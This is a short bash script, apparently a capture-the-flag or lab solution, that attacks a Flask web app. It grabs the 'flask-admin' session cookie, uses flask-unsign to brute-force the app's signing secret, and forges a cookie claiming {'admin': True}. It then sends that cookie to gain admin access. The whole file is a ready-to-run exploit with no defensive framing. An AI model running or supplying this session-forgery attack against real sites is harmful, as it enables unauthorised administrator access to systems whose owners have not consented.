
if [ $# -ne 1 ]; then
	echo "usage: $0 http://<host>:<port>"
	exit 1
fi
host=$1

if ! curl -s $host --cookie-jar cookie.txt > /dev/null; then
	echo "error: unable to connect to $host"
	exit 1
fi

cookie=$(cat cookie.txt|grep flask-admin|awk '{print $7}')
rm cookie.txt
echo "cookie := $cookie
"

echo "decoding cookie: $(flask-unsign --decode --cookie $cookie)"

secret=$(flask-unsign --unsign --cookie $cookie|tr -d \')
echo "secret := $secret
"

admincookie=$(flask-unsign --sign --cookie "{'admin': True}" --secret $secret)
echo "forged admincookie := $admincookie
"

curl $host --cookie "flask-admin=$admincookie"
echo 
